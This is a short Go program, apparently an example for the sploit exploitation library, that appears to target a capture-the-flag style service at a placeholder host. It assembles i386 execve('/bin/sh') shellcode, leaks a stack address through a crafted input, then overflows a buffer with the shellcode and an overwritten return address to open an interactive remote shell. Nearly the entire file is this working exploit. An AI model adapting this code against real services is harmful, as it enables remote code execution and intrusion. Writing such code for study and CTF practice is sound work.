package main;

import(
    sp "github.com/zznop/sploit"
)

var arch = &sp.Processor {
    Architecture: sp.ArchI386,
    Endian: sp.LittleEndian,
}

var scInstrs = `mov al, 0xb   /* __NR_execve */
                sub esp, 0x30 /* Get pointer to /bin/sh (see below) */
                mov ebx, esp  /* filename (/bin/sh) */
                xor ecx, ecx  /* argv (NULL) */
                xor edx, edx  /* envp (NULL) */
                int 0x80`

func main() {
    shellcode, _ := sp.Asm(arch, scInstrs)
    r, _ := sp.NewRemote("tcp", "some.pwnable.on.the.interwebz:10800")
    defer r.Close()
    r.RecvUntil([]byte("HELLO:"), true)

    // Leak a stack address
    r.Send(append([]byte("/bin/sh\x00AAAAAAAAAAAA"), sp.PackUint32LE(0x08048087)...))
    resp, _ := r.RecvN(20)
    leakAddr := sp.UnpackUint32LE(resp[0:4])

    // Pop a shell
    junk := make([]byte, 20-len(shellcode))
    junk = append(junk, sp.PackUint32LE(leakAddr-4)...)
    r.Send(append(shellcode, junk...))
    r.Interactive()
}
